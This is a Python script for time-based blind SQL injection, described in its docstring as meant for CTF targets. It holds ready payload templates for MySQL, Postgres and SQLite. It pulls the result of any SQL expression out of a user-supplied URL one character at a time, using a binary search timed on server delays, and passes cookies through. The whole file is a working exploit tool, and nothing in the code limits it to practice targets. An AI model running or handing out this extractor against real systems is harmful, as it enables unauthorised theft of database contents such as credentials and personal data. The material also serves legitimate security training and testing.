#!/usr/bin/env python3
"""Time-based blind SQLi extractor for CTF targets.

The URL must contain INJECT. This script measures response time and performs
binary search over printable ASCII. Tune --delay and --threshold per target.
"""

import argparse
import time
import requests


TEMPLATES = {
    "mysql": "1 AND IF(ASCII(SUBSTR((EXPR),POS,1))>ORD,SLEEP(DELAY),0)-- -",
    "postgres": "1;SELECT CASE WHEN (ASCII(SUBSTR((EXPR),POS,1))>ORD) THEN pg_sleep(DELAY) ELSE pg_sleep(0) END--",
    "sqlite": "1 AND CASE WHEN (UNICODE(SUBSTR((EXPR),POS,1))>ORD) THEN randomblob(80000000) ELSE 1 END-- -",
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="URL containing INJECT placeholder")
    ap.add_argument("--expr", required=True)
    ap.add_argument("--db", choices=sorted(TEMPLATES), default="mysql")
    ap.add_argument("--template", help="Override template with EXPR POS ORD DELAY placeholders")
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--threshold", type=float, default=2.0)
    ap.add_argument("--max-len", type=int, default=80)
    ap.add_argument("--cookie", action="append", default=[])
    args = ap.parse_args()

    cookie = dict(x.split("=", 1) for x in args.cookie)
    template = args.template or TEMPLATES[args.db]
    session = requests.Session()
    out = ""

    for pos in range(1, args.max_len + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = (template.replace("EXPR", args.expr)
                              .replace("POS", str(pos))
                              .replace("ORD", str(mid))
                              .replace("DELAY", str(args.delay)))
            target = args.url.replace("INJECT", requests.utils.quote(payload, safe="()'\"=<>-*/,; "))
            start = time.time()
            requests.get(target, cookies=cookie, timeout=max(10, args.delay + 5))
            elapsed = time.time() - start
            if elapsed >= args.threshold:
                lo = mid + 1
            else:
                hi = mid - 1
        if lo < 32 or lo > 126:
            break
        out += chr(lo)
        print(repr(out), flush=True)


if __name__ == "__main__":
    main()

